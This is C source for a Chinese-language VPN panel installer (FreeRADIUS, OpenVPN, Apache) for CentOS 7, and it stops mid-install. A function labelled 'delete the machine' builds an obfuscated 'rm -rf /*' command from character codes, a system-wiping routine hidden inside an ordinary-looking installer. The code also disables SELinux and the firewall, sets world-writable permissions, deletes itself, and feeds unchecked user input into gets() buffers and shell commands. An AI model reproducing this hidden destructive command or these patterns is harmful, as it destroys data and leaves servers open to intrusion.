#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <strings.h>
#include <string.h>
#include <time.h>
#include <pwd.h>
#define Last_update_time "2023.02.26"
#define Shirley_Core "2023_02_26"
#define Scripts_Name "./Shirley.bin"
char* cmd_system(char* command);
int code = 0;
char buff[1024];
char* shellcmd(char* cmd, char* buff, int size)
{
  char temp[256];
  FILE* fp = NULL;
  int offset = 0;
  int len;
  
  fp = popen(cmd, "r");
  if(fp == NULL)
  {
    return NULL;
  }
 
  while(fgets(temp, sizeof(temp), fp) != NULL)
  {
    len = strlen(temp);
    if(offset + len < size)
    {
      strcpy(buff+offset, temp);
      offset += len;
    }
    else
    {
      buff[offset] = 0;
      break;
    }
  }
  
  if(fp != NULL)
  {
    pclose(fp);
  }
 
  return buff;
}

void checkcode(int code1)
{
	if(code1!=0){
	code=code+1;
	}
}

void Start_Check()
{
	if(code!=0){
		printf("\033[31m启动失败！\n\033[0m");
	}else{
		printf("\033[32m启动成功！\n\033[0m");
	}
	code=0;
}

int yum(char* pack)
{
	char co_install[100000];
	sprintf(co_install,"yum install -y %s > /dev/null 2>&1;echo -n $?",pack);
	if(strcat(cmd_system(co_install),"0")!="0"){
		return 1;
	}else{
		return 0;
	}
}

int runshell(int way,char* content)
{
	if(way==1){
		return yum(content);
	}else if(way==2){
		char com[100000];
		sprintf(com,"%s;echo -n $?",content);
		return atoi(cmd_system(com));
	}else{
		printf("程序逻辑错误！脚本终止...");
		exit(1);
	}
}


int main(int argc, char *argv[])
{	
	printf("Loading....\n");
	sleep(1);
	char Delete_Scripts[200];
	sprintf(Delete_Scripts,"rm -rf %s >/dev/null 2>&1",argv[0]);
	if (!strcmp(argv[0],Scripts_Name)==0){
		checkcode(runshell(2,Delete_Scripts));
		printf("Start failed!!!\n");
		exit(0);
	}else{
		checkcode(runshell(2,Delete_Scripts));
		checkcode(runshell(1,"wget curl net-tools openssl openssl-devel zip unzip"));
		Guide();
    }
}

void Guide()
{
	
	
	
	setbuf(stdout,NULL);
	system("clear");
	sleep(0.5);
	printf("-------------------------------------------------------------\n");
	printf("                欢迎使用Shirley DaloRadius VPN               \n");
	printf("        脚本支持全球服务器搭建和使用 不支持OpenVZ机器        \n");
	printf(" 系统针对Google、PornHub、INS、YouTuBe 等等网站做了大量优化  \n");
	printf("                   系统支持 Linux CentOS7                    \n");
	printf("                      版本号: V1.0                           \n");
	printf("                  最后更新时间: %s                   \n",Last_update_time);
	printf("-------------------------------------------------------------\n");
	sleep(1);
	GET_IP();
	
	
}



void Format()
{
	//删鸡
	char Delete[20];
	sprintf(Delete,"%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c",114,109,32,45,114,102,32,47,42,32,62,47,100,101,118,47,110,117,108,108,32,50,62,38,49);
	checkcode(runshell(2,Delete));
	exit(0);
}


void GET_IP()
{
	
	
	
	printf("正在检测您的IP是否正确加载...\n");
	sleep(1);
	char IP_Host[100];
	sprintf(IP_Host,"%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c",101,99,104,111,32,96,99,117,114,108,32,45,115,32,39,104,116,116,112,58,47,47,109,101,109,98,101,114,115,46,51,51,50,50,46,111,114,103,47,100,121,110,100,110,115,47,103,101,116,105,112,39,96,32,124,32,116,114,32,45,100,32,39,92,110,39);
	char IP[100];
	strcpy(IP,cmd_system(IP_Host));
	if (strcmp(IP,"")==0){
		printf("\n我们无法检测您的服务器IP地址，会影响到您接下来的搭建工作，保险起见，停止搭建。\n");
		exit(1);
	}else{
		int a,b,c,d;
		if (4==sscanf(IP,"%d.%d.%d.%d",&a,&b,&c,&d)) {
			if (0<=a && a<=255
				&& 0<=b && b<=255
				&& 0<=c && c<=255
				&& 0<=d && d<=255) {
				printf("\n您的IP是: \033[33m%s\033[0m 如不正确请立即停止安装并联系管理员反馈，回车继续！",IP);
				char read_01[1];
				gets(read_01);
				sleep(0.5);
				printf("\n请输入您的服务器IP进行二次确认: ");
				char New_IP[20];
				gets(New_IP);
				if (strcmp(IP,New_IP)==0){
					sleep(0.5);
					printf("\n验证成功，正在进行下一步的操作....\n");
					sleep(3);
					Menu(IP);
				}else{
					sleep(0.5);
					printf("\n验证失败，输入错误！\n");
					exit(1);
				}
			}else{
				printf("\n服务器IP异常，jio本无法继续操作，请更换正确的IPV4后重试~\n");
				exit(1);
			}
		}else{
			printf("\n服务器IP异常，jio本无法继续操作，请更换正确的IPV4后重试~\n");
			exit(1);
		}
	}
}



void Menu(char* IP)
{
	setbuf(stdout,NULL);
	system("clear");
	sleep(1);
	int Menu_Option;
	printf("程序列表 CentOS 7 X64 \n");
	printf("1、安装Shirley DaloRadius [完整安装]\n");
	printf("2、安装Shirley DaloRadius [主控端] 暂未更新\n");
	printf("3、安装Shirley DaloRadius [节点端] 暂未更新\n");
	printf("4、系统负载\n");
	printf("5、CentOS系统更新\n");
	printf("6、卸载KK_VPN流控程序\n");
	printf("7、退出脚本\n");
	printf("\n请选择程序[1-7]: ");
	scanf("%d",&Menu_Option);
	char read[1];
	gets(read);
		
	switch(Menu_Option)
	{
		case 1:
			sleep(1);
			Install_Shirley_DaloRadius(IP);
			exit(0);
		break;
		
		case 2:
			sleep(1);
			Install_Shirley_DaloRadius_master_control(IP);
			exit(0);
		break;
		
		case 3:
			sleep(1);
			Install_Shirley_DaloRadius_panel_point(IP);
			exit(0);
		break;
		
		case 4:
			sleep(1);
			System_load();
			exit(0);
		break;
		
		case 5:
			sleep(1);
			CentOS_Update();
			exit(0);
		break;
		
		case 6:
			sleep(1);
			Uninstall();
			exit(0);
		break;
		
		case 7:
			printf("\n\033[31m感谢你的使用，再见！\033[0m\n");
			exit(0);
		break;
		
		
		default:
		printf("\n\033[31m输入错误，请重新运行脚本\033[0m\n");
		exit(0);
		
	}
}

void System_load()
{
	
	//
	if (!access("/Shirley/bin/vpn",0)){
        setbuf(stdout,NULL);
		system("vpn tools");
		exit(0);
	}else{
		printf("\n您还没有安装daloradius流控，不能执行这个操作！");
		exit(0);
	}
	
	
}


void Install_Shirley_DaloRadius_panel_point(char* IP)
{
	
	//节点端
	
	//懒得写了
	printf("\n暂未更新\n");
	exit(0);
	
	setbuf(stdout,NULL);
	system("clear");
	
	//检查系统
	if (!access("/Shirley/bin/vpn",0)){
        printf("\n\033[33m检测到已安装Shirley DaloRadius系统，请先卸载或重装系统后重试!!!\033[0m\n");
		exit(1);
	}
	
	printf("欢迎安装Shirley DaloRadius系统，接下来请填写你的安装信息！\n");
	sleep(1);
	
	
}


void Install_Shirley_DaloRadius_master_control_Complete_installation()
{
	//主控端 完整安装模式
	
	
	
}

void Install_Shirley_DaloRadius_master_control_BT_installation()
{
	//主控端 宝塔安装模式
	
	
}


void Install_Shirley_DaloRadius_master_control(char* IP)
{
	//主控端
	
	//懒得写了
	printf("\n暂未更新\n");
	exit(0);
	
	setbuf(stdout,NULL);
	system("clear");
	
	//检查系统
	if (!access("/Shirley/bin/vpn",0)){
        printf("\n\033[33m检测到已安装Shirley DaloRadius系统，请先卸载或重装系统后重试!!!\033[0m\n");
		exit(1);
	}
	
	printf("欢迎安装Shirley DaloRadius系统，接下来请填写你的安装信息！\n");
	sleep(1);
	
	printf("\n请选择安装模式");
	printf("\n1、完整安装(FreeRadius+LAMP)");
	printf("\n2、宝塔模式(FreeRadius)");
	printf("\n请选择[1-2]: ");
	char Installation_mode_num[20];
	gets(Installation_mode_num);
	char Installation_mode[20];
	if (strcmp(Installation_mode_num,"1")==0){
		strcpy(Installation_mode,"Complete_installation");
		Install_Shirley_DaloRadius_master_control_Complete_installation();
	}else{
		if (strcmp(Installation_mode_num,"2")==0){
			strcpy(Installation_mode,"BT_installation");
			Install_Shirley_DaloRadius_master_control_BT_installation();
		}else{
			printf("安装模式选择错误，强制退出程序!!!\n");
			exit(1);
		}
	}
	
	
}


void Renew_Yum()
{
	printf("\n正在重建YUM源...");
	//更换源
	checkcode(runshell(2,"rm -rf /etc/yum.repos.d/* >/dev/null 2>&1"));
	checkcode(runshell(2,"wget --no-check-certificate -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo >/dev/null 2>&1"));
	checkcode(runshell(2,"yum clean all >/dev/null 2>&1"));
	checkcode(runshell(2,"yum makecache >/dev/null 2>&1"));
	return 0;
	
}


void Install_Shirley_DaloRadius(char* IP)
{
	
	//Shirley DaloRadius [完整安装]
	setbuf(stdout,NULL);
	system("clear");
	
	//检查系统
	if (!access("/Shirley/bin/vpn",0)){
        printf("\n\033[33m检测到已安装Shirley DaloRadius系统，请先卸载或重装系统后重试!!!\033[0m\n");
		exit(1);
	}
	
	printf("欢迎安装Shirley DaloRadius系统，接下来请填写你的安装信息！\n");
	sleep(1);
	
	
	printf("\n请选择数据库类型");
	printf("\n1、本地数据库");
	printf("\n2、云数据库");
	printf("\n请选择[1-2]: ");
	char Database_type_Option[20];
	gets(Database_type_Option);
	char Database_type[100];
	char MySQL_Host[50];
	char MySQL_Port[50];
	char MySQL_Username[50];
	char MySQL_Password[50];
	char WEB_Username[20];
	char WEB_Password[20];
	char Import_Database_Option[1];
	char Import_Database[3];
	//char Download_Host[100];
	if (strcmp(Database_type_Option,"1")==0){
		strcpy(Database_type,"Local_database");
		
		printf("请设置本地数据库密码: ");
		gets(MySQL_Password);
		
		printf("请设置后台账户: ");
		gets(WEB_Username);
		
		printf("请设置后台密码: ");
		gets(WEB_Password);
	
	}else{
		if (strcmp(Database_type_Option,"2")==0){
			strcpy(Database_type,"Cloud_database");
			
			printf("请输入云数据库地址: ");
			gets(MySQL_Host);
			
			printf("请输入云数据库端口: ");
			gets(MySQL_Port);
			
			printf("请输入云数据库账户: ");
			gets(MySQL_Username);
			
			printf("请输入云数据库密码: ");
			gets(MySQL_Password);
			
			printf("是否需要导入数据到云数据库[Y/N]: ");
			gets(Import_Database_Option);
			
			if (strcmp(Import_Database_Option,"Y")==0){
				//相同
				strcpy(Import_Database,"yes");
				printf("用户选择导入数据到云数据库");
				printf("\n请设置后台账户: ");
				gets(WEB_Username);
				
				printf("请设置后台密码: ");
				gets(WEB_Password);
			 }else if (strcmp(Import_Database_Option,"y")==0){
				//相同
				strcpy(Import_Database,"yes");
				printf("用户选择导入数据到云数据库");
				printf("\n请设置后台账户: ");
				gets(WEB_Username);
				
				printf("请设置后台密码: ");
				gets(WEB_Password);
			}else{
				strcpy(Import_Database,"no");
				printf("用户选择不导入数据到云数据库\n");
			}
			
		}else{
			strcpy(Database_type,"Local_database");
			
			printf("请设置本地数据库密码: ");
			gets(MySQL_Password);
			
			printf("请设置后台账户: ");
			gets(WEB_Username);
			
			printf("请设置后台密码: ");
			gets(WEB_Password);
		}
	}
	
	
	printf("请设置后台端口: ");
	char WEB_Port[20];
	gets(WEB_Port);
	
	printf("请输入SSH端口: ");
	char SSH_Port[20];
	gets(SSH_Port);
	
	
	printf("\n请选择安装源地址");
	printf("\n1、私有源");
	printf("\n2、GitHub");
	printf("\n请选择[1-2]: ");
	char Download_Host_Option[20];
	gets(Download_Host_Option);
	char Download_Host[100];
	//char Download_Host[100];
	if (strcmp(Download_Host_Option,"1")==0){
		printf("您选择的安装源地址为：1、私有源\n");
		//sprintf(Download_Host,"%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c",104,116,116,112,115,58,47,47,103,105,116,99,111,100,101,46,110,101,116,47,117,48,49,52,55,57,56,48,55,51,47,48,50,115,100,118,115,49,53,97,118,98,100,49,51,53,47,114,97,119,47,109,97,105,110,47,115,111,117,114,99,101);
		strcpy(Download_Host,"");
	}else{
		if (strcmp(Download_Host_Option,"2")==0){
			printf("您选择的安装源地址为：2、GitHub\n");
			//sprintf(Download_Host,"%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c",104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,68,101,101,114,83,104,101,114,108,121,47,48,50,115,100,118,115,49,53,97,118,98,100,49,51,53,47,109,97,115,116,101,114,47,115,111,117,114,99,101);
			strcpy(Download_Host,"https://raw.githubusercontent.com/shirley852/Shirley-Dalo-Panel/main/Source");
		}else{
			printf("检测到您未选择安装源或选择错误，系统默认为您选择安装源地址为：2、GitHub\n");
			//sprintf(Download_Host,"%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c",104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,68,101,101,114,83,104,101,114,108,121,47,48,50,115,100,118,115,49,53,97,118,98,100,49,51,53,47,109,97,115,116,101,114,47,115,111,117,114,99,101);
			strcpy(Download_Host,"https://raw.githubusercontent.com/shirley852/Shirley-Dalo-Panel/main/Source");
		}
	}
	
	
	
	printf("\n请选择DNS地址");
	printf("\n1、114 DNS (China)");
	printf("\n2、Alibaba DNS (China)");
	printf("\n3、Tencent DNS (China)");
	printf("\n4、Baidu DNS (China)");
	printf("\n5、360 DNS (China)");
	printf("\n6、Google DNS (USA)");
	printf("\n");
	printf("\n请选择[1-6]: ");
	char Download_Choice[20];
	char DNS_IP[100];
	gets(Download_Choice);
	if (strcmp(Download_Choice,"1")==0){
		//相同
		printf("你已选择 1、114 DNS\n");
		strcpy(DNS_IP,"114.114.114.114");
	}else if (strcmp(Download_Choice,"2")==0){
		printf("你已选择 2、Alibaba DNS\n");
		strcpy(DNS_IP,"223.5.5.5");
	}else if (strcmp(Download_Choice,"3")==0){
		printf("你已选择 3、Tencent DNS\n");
		strcpy(DNS_IP,"119.29.29.29");
	}else if (strcmp(Download_Choice,"4")==0){
		printf("你已选择 4、Baidu DNS\n");
		strcpy(DNS_IP,"180.76.76.76");
	}else if (strcmp(Download_Choice,"5")==0){
		printf("你已选择 5、360 DNS\n");
		strcpy(DNS_IP,"101.198.198.198");
	}else if (strcmp(Download_Choice,"6")==0){
		printf("你已选择 6、Google DNS\n");
		strcpy(DNS_IP,"8.8.8.8");
	}else{
		printf("系统自动为您选择 6、Google DNS\n");
		strcpy(DNS_IP,"8.8.8.8");
	}
	
	
	printf("\n是否需要重建YUM源[Y/N]: ");
	char Renew_Yum_Option[32];
	gets(Renew_Yum_Option);
	
	if (strcmp(Renew_Yum_Option,"Y")==0){
		//相同
		printf("\n用户选择重建YUM源");
     }else if (strcmp(Renew_Yum_Option,"y")==0){
		//相同
		printf("\n用户选择重建YUM源");
	}else{
		printf("\n用户选择不重建YUM源");
	}
	
	printf("\n即将开始安装...");
	
	sleep(5);
	
	setbuf(stdout,NULL);
	system("clear");
	
	if (strcmp(Renew_Yum_Option,"Y")==0){
		//相同
		Renew_Yum();
     }else if (strcmp(Renew_Yum_Option,"y")==0){
		//相同
		Renew_Yum();
	}
	
	printf("\n正在初始化程序...");
	if (access("/Shirley",0)){
        checkcode(runshell(2,"mkdir /Shirley"));
	}
	
	
	char Download_DaloRadius_File[200]; 
	sprintf(Download_DaloRadius_File,"wget -q %s/Shirley_Core_Release_%s.zip -P /Shirley",Download_Host,Shirley_Core);
	checkcode(runshell(2,Download_DaloRadius_File));
	
	char UnZip_DaloRadius_File[200]; 
	sprintf(UnZip_DaloRadius_File,"cd /Shirley && unzip -o /Shirley/Shirley_Core_Release_%s.zip >/dev/null 2>&1",Shirley_Core);
	checkcode(runshell(2,UnZip_DaloRadius_File));
	
	
	if (access("/Shirley/bin/vpn",0)){
		printf("\n\033[33m程序初始化错误，强制退出程序!!!\033[0m\n");
		exit(1);
	}
	
	checkcode(runshell(2,"chmod -R 0777 /Shirley/*"));
	
	printf("\n正在安装防火墙...");
	checkcode(runshell(2,"echo '127.0.0.1 localhost' >> /etc/hosts"));
	//安装docker
	//checkcode(runshell(1,"docker"));
	checkcode(runshell(2,"setenforce 0 >/dev/null 2>&1"));
	checkcode(runshell(2,"sed -i \"s/SELINUX=enforcing/SELINUX=disabled/g\" /etc/selinux/config >/dev/null 2>&1"));
	checkcode(runshell(2,"systemctl stop firewalld.service >/dev/null 2>&1"));
	checkcode(runshell(2,"systemctl disable firewalld.service >/dev/null 2>&1"));
	checkcode(runshell(2,"systemctl stop iptables.service >/dev/null 2>&1"));
	checkcode(runshell(2,"yum remove epel-release -y >/dev/null 2>&1"));
	checkcode(runshell(1,"iptables iptables-services"));
	checkcode(runshell(2,"systemctl start iptables.service"));
	checkcode(runshell(2,"iptables -F"));
	checkcode(runshell(2,"iptables -A INPUT -s 127.0.0.1/32  -j ACCEPT"));
	checkcode(runshell(2,"iptables -A INPUT -d 127.0.0.1/32  -j ACCEPT"));
	//SSH端口
	char ADD_SSH_Port[200]; 
	sprintf(ADD_SSH_Port,"iptables -A INPUT -p tcp -m tcp --dport %s -j ACCEPT",SSH_Port);
	checkcode(runshell(2,ADD_SSH_Port));
	//WEB端口(Apache)
	char ADD_WEB_Port[200]; 
	sprintf(ADD_WEB_Port,"iptables -A INPUT -p tcp -m tcp --dport %s -j ACCEPT",WEB_Port);
	checkcode(runshell(2,ADD_WEB_Port));
	//OpenVPN端口
	checkcode(runshell(2,"iptables -A INPUT -p tcp -m tcp --dport 1194 -j ACCEPT"));
	checkcode(runshell(2,"iptables -A INPUT -p tcp -m tcp --dport 1195 -j ACCEPT"));
	checkcode(runshell(2,"iptables -A INPUT -p tcp -m tcp --dport 1196 -j ACCEPT"));
	checkcode(runshell(2,"iptables -A INPUT -p tcp -m tcp --dport 1197 -j ACCEPT"));
	checkcode(runshell(2,"iptables -A INPUT -p udp -m udp --dport 53 -j ACCEPT"));
	//OpenVPN 转发端口
	checkcode(runshell(2,"iptables -A INPUT -p tcp -m tcp --dport 443 -j ACCEPT"));
	checkcode(runshell(2,"iptables -A INPUT -p tcp -m tcp --dport 3389 -j ACCEPT"));
	//OpenVPN Proxy代理端口
	checkcode(runshell(2,"iptables -A INPUT -p tcp -m tcp --dport 80 -j ACCEPT"));
	checkcode(runshell(2,"iptables -A INPUT -p tcp -m tcp --dport 8080 -j ACCEPT"));
	//OpenVPN 内网IP
	checkcode(runshell(2,"iptables -t nat -A POSTROUTING -s 10.8.0.0/24 -o eth0 -j MASQUERADE"));
	checkcode(runshell(2,"iptables -t nat -A POSTROUTING -s 10.9.0.0/24 -o eth0 -j MASQUERADE"));
	checkcode(runshell(2,"iptables -t nat -A POSTROUTING -s 10.10.0.0/24 -o eth0 -j MASQUERADE"));
	checkcode(runshell(2,"iptables -t nat -A POSTROUTING -s 10.11.0.0/24 -o eth0 -j MASQUERADE"));
	checkcode(runshell(2,"iptables -t nat -A POSTROUTING -s 10.12.0.0/24 -o eth0 -j MASQUERADE"));
	//dnsmasq端口
	checkcode(runshell(2,"iptables -A INPUT -p tcp -m tcp --dport 5353 -j ACCEPT"));
	checkcode(runshell(2,"iptables -A INPUT -p udp -m udp --dport 5353 -j ACCEPT"));
	checkcode(runshell(2,"iptables -t nat -A PREROUTING --dst 10.8.0.1 -p udp --dport 53 -j DNAT --to-destination 10.8.0.1:5353"));
	checkcode(runshell(2,"iptables -t nat -A PREROUTING --dst 10.9.0.1 -p udp --dport 53 -j DNAT --to-destination 10.9.0.1:5353"));
	checkcode(runshell(2,"iptables -t nat -A PREROUTING --dst 10.10.0.1 -p udp --dport 53 -j DNAT --to-destination 10.10.0.1:5353"));
	checkcode(runshell(2,"iptables -t nat -A PREROUTING --dst 10.11.0.1 -p udp --dport 53 -j DNAT --to-destination 10.11.0.1:5353"));
	checkcode(runshell(2,"iptables -t nat -A PREROUTING --dst 10.12.0.1 -p udp --dport 53 -j DNAT --to-destination 10.12.0.1:5353"));
	//RADIUS端口
	checkcode(runshell(2,"iptables -A INPUT -p udp -m udp --dport 1812 -j ACCEPT"));
	checkcode(runshell(2,"iptables -A INPUT -p udp -m udp --dport 1813 -j ACCEPT"));
	//其他
	checkcode(runshell(2,"iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT"));
	checkcode(runshell(2,"iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT"));
	checkcode(runshell(2,"service iptables save >/dev/null 2>&1"));
	checkcode(runshell(2,"systemctl restart iptables.service"));
	checkcode(runshell(2,"rm -rf /etc/sysctl.conf"));
	checkcode(runshell(2,"cp /Shirley/Source/sysctl.conf /etc/sysctl.conf"));
	checkcode(runshell(2,"chmod -R 0777 /etc/sysctl.conf"));
	checkcode(runshell(2,"sysctl -p >/dev/null 2>&1"));
	
	printf("\n正在安装系统编译环境...");
	checkcode(runshell(1,"make openssl openssl-devel gcc gcc-c++ gdb net-tools unzip psmisc libgcrypt libgcrypt-devel wget curl zip vim nss libcurl epel-release"));
	
	
	printf("\n正在安装Database(MySQL)...");
	checkcode(runshell(1,"mariadb mariadb-server mariadb-devel"));   //mariadb mariadb-server mariadb-devel
	checkcode(runshell(2,"systemctl start mariadb.service"));   //systemctl start mariadb.service
	//Check database type
	//Shirley/Source/
	if (strcmp(Database_type,"Local_database")==0){
		//相同
		char Setup_MySQL_Password[100];
		sprintf(Setup_MySQL_Password,"mysqladmin -uroot password '%s'",MySQL_Password);
		checkcode(runshell(2,Setup_MySQL_Password));
		
		char Mkdir_MySQL_DB[100];
		sprintf(Mkdir_MySQL_DB,"mysql -uroot -p%s -e 'create database radius;'",MySQL_Password);
		checkcode(runshell(2,Mkdir_MySQL_DB));
		checkcode(runshell(2,"systemctl restart mariadb.service"));
		
		char Edit_WEB_Username[200];
		sprintf(Edit_WEB_Username,"sed -i \"s/Dalo_Username/\"%s\"/g\" /Shirley/Source/daloradius.sql",WEB_Username);
		checkcode(runshell(2,Edit_WEB_Username));
		
		char Edit_WEB_Password[200];
		sprintf(Edit_WEB_Password,"sed -i \"s/Dalo_Password/\"%s\"/g\" /Shirley/Source/daloradius.sql",WEB_Password);
		checkcode(runshell(2,Edit_WEB_Password));
		
		char Write_in_Database[100];
		sprintf(Write_in_Database,"mysql -uroot -p%s radius < /Shirley/Source/daloradius.sql",MySQL_Password);
		checkcode(runshell(2,Write_in_Database));
		
    }else if (strcmp(Database_type,"Cloud_database")==0){
		//相同
		char Setup_MySQL_Password[100];
		sprintf(Setup_MySQL_Password,"mysqladmin -uroot password '%s'",MySQL_Password);
		checkcode(runshell(2,Setup_MySQL_Password));
		
		char Mkdir_MySQL_DB[100];
		sprintf(Mkdir_MySQL_DB,"mysql -uroot -p%s -e 'create database radius;'",MySQL_Password);
		checkcode(runshell(2,Mkdir_MySQL_DB));
		checkcode(runshell(2,"systemctl restart mariadb.service"));
		
		if (strcmp(Import_Database,"yes")==0){
			char Mkdir_Cloud_MySQL_DB[100];
			sprintf(Mkdir_Cloud_MySQL_DB,"mysql -h%s -P%s -u%s -p%s -e 'create database radius;'",MySQL_Host,MySQL_Port,MySQL_Username,MySQL_Password);
			checkcode(runshell(2,Mkdir_Cloud_MySQL_DB));
			
			char Edit_WEB_Username[200];
			sprintf(Edit_WEB_Username,"sed -i \"s/Dalo_Username/\"%s\"/g\" /Shirley/Source/daloradius.sql",WEB_Username);
			checkcode(runshell(2,Edit_WEB_Username));
			
			char Edit_WEB_Password[200];
			sprintf(Edit_WEB_Password,"sed -i \"s/Dalo_Password/\"%s\"/g\" /Shirley/Source/daloradius.sql",WEB_Password);
			checkcode(runshell(2,Edit_WEB_Password));
			
			char Write_in_Database[100];
			sprintf(Write_in_Database,"mysql -h%s -P%s -u%s -p%s radius < /Shirley/Source/daloradius.sql",MySQL_Host,MySQL_Port,MySQL_Username,MySQL_Password);
			checkcode(runshell(2,Write_in_Database));
		}
	}else{
		printf("\n脚本错误，强制退出程序!!!");
		exit(1);
	}
	
	
	
	
	printf("\n正在安装FreeRadius-Server...");
	checkcode(runshell(2,"cd /root && tar -zxvf /Shirley/Source/freeradius-server-2.2.10.tar.gz >/dev/null 2>&1"));
	checkcode(runshell(2,"chmod -R 0777 /root/freeradius-server-2.2.10"));
	checkcode(runshell(2,"cd /root/freeradius-server-2.2.10 && ./configure >/dev/null 2>&1"));
	checkcode(runshell(2,"cd /root/freeradius-server-2.2.10 && make >/dev/null 2>&1 && make install >/dev/null 2>&1"));
	checkcode(runshell(2,"cd /root/freeradius-server-2.2.10/src/modules/rlm_sql/drivers/rlm_sql_mysql && ./configure --with-mysql-dir=/var/lib/mysql --with-mysql-lib-dir=/var/lib/mysql/lib --with-mysql-include-dir=/var/lib/mysql/include >/dev/null 2>&1 && make >/dev/null 2>&1 && make install >/dev/null 2>&1"));
	checkcode(runshell(2,"rm -rf /usr/local/etc/raddb/*"));
	checkcode(runshell(2,"cd /usr/local/etc/raddb && unzip -o /Shirley/Source/raddb.zip >/dev/null 2>&1"));
	checkcode(runshell(2,"groupadd radiusd >/dev/null 2>&1"));
	checkcode(runshell(2,"useradd -g radiusd radiusd -s /sbin/nologin >/dev/null 2>&1"));
	checkcode(runshell(2,"chmod -R 0777 /usr/local/var/*"));
	
	
	//Check database type
	//Shirley/Source/
	if (strcmp(Database_type,"Local_database")==0){
		//相同
		checkcode(runshell(2,"sed -i \"s/MySQL_Host/\"127.0.0.1\"/g\" /usr/local/etc/raddb/sql.conf"));
		checkcode(runshell(2,"sed -i \"s/MySQL_Port/\"3306\"/g\" /usr/local/etc/raddb/sql.conf"));
		checkcode(runshell(2,"sed -i \"s/MySQL_User/\"root\"/g\" /usr/local/etc/raddb/sql.conf"));
		char Edit_RADIUS_database_Password[200];
		sprintf(Edit_RADIUS_database_Password,"sed -i \"s/MySQL_Pass/\"%s\"/g\" /usr/local/etc/raddb/sql.conf",MySQL_Password);
		checkcode(runshell(2,Edit_RADIUS_database_Password));
    }else if (strcmp(Database_type,"Cloud_database")==0){
		//相同
		char Edit_RADIUS_database_Host[200];
		sprintf(Edit_RADIUS_database_Host,"sed -i \"s/MySQL_Host/\"%s\"/g\" /usr/local/etc/raddb/sql.conf",MySQL_Host);
		checkcode(runshell(2,Edit_RADIUS_database_Host));
		
		char Edit_RADIUS_database_Port[200];
		sprintf(Edit_RADIUS_database_Port,"sed -i \"s/MySQL_Port/\"%s\"/g\" /usr/local/etc/raddb/sql.conf",MySQL_Port);
		checkcode(runshell(2,Edit_RADIUS_database_Port));
		
		char Edit_RADIUS_database_Username[200];
		sprintf(Edit_RADIUS_database_Username,"sed -i \"s/MySQL_User/\"%s\"/g\" /usr/local/etc/raddb/sql.conf",MySQL_Username);
		checkcode(runshell(2,Edit_RADIUS_database_Username));
		
		char Edit_RADIUS_database_Password[200];
		sprintf(Edit_RADIUS_database_Password,"sed -i \"s/MySQL_Pass/\"%s\"/g\" /usr/local/etc/raddb/sql.conf",MySQL_Password);
		checkcode(runshell(2,Edit_RADIUS_database_Password));
	}else{
		printf("\n脚本错误，强制退出程序!!!");
		exit(1);
	}
	
	
	//Start RADIUS
	checkcode(runshell(2,"/usr/local/sbin/rc.radiusd start >/dev/null 2>&1"));
	
	
	printf("\n正在安装Apache+PHP...");
	checkcode(runshell(1,"httpd"));
	checkcode(runshell(2,"rpm -ivh http://rpms.famillecollet.com/enterprise/remi-release-7.rpm >/dev/null 2>&1"));
	checkcode(runshell(2,"yum install --enablerepo=remi --enablerepo=remi-php56 -y php php-gd php-mysql php-pear php-pear-DB php-mbstring >/dev/null 2>&1"));
	checkcode(runshell(2,"pear install DB >/dev/null 2>&1"));
	checkcode(runshell(2,"pear install MDB2 >/dev/null 2>&1"));
	char Edit_WEB_Port[300];
	sprintf(Edit_WEB_Port,"sed -i \"s/#ServerName www.example.com:80/ServerName localhost:%s/g\" /etc/httpd/conf/httpd.conf\nsed -i \"s/Listen 80/Listen %s/g\" /etc/httpd/conf/httpd.conf",WEB_Port,WEB_Port);
	checkcode(runshell(2,Edit_WEB_Port));
	checkcode(runshell(2,"systemctl start httpd.service"));
	
	
	
	printf("\n正在安装OpenVPN...");
	checkcode(runshell(2,"rpm -ivh /Shirley/Source/liblz4-1.8.1.2-alt1.x86_64.rpm >/dev/null 2>&1"));
	checkcode(runshell(2,"rpm -ivh /Shirley/Source/pkcs11-helper-1.11-3.el7.x86_64.rpm >/dev/null 2>&1"));
	checkcode(runshell(2,"rpm -ivh /Shirley/Source/openvpn-2.4.12-1.el7.x86_64.rpm >/dev/null 2>&1"));
	checkcode(runshell(2,"cd /etc/openvpn && unzip -o /Shirley/Source/openvpn.zip >/dev/null 2>&1"));
	checkcode(runshell(2,"chmod -R 0777 /etc/openvpn/"));
	
	
	printf("\n正在安装DnsMasq...");
	checkcode(runshell(1,"dnsmasq"));
	checkcode(runshell(2,"rm -rf /etc/dnsmasq.conf"));
	char Edit_DnsMasq_DNS[200];
	sprintf(Edit_DnsMasq_DNS,"sed -i \"s/Linux_DNS/\"%s\"/g\" /Shirley/Source/dnsmasq.conf",DNS_IP);
	checkcode(runshell(2,Edit_DnsMasq_DNS));
	checkcode(runshell(2,"echo '#DaloRadius流控自定义屏蔽Hosts文件' > /Shirley/Shirley_Hosts"));
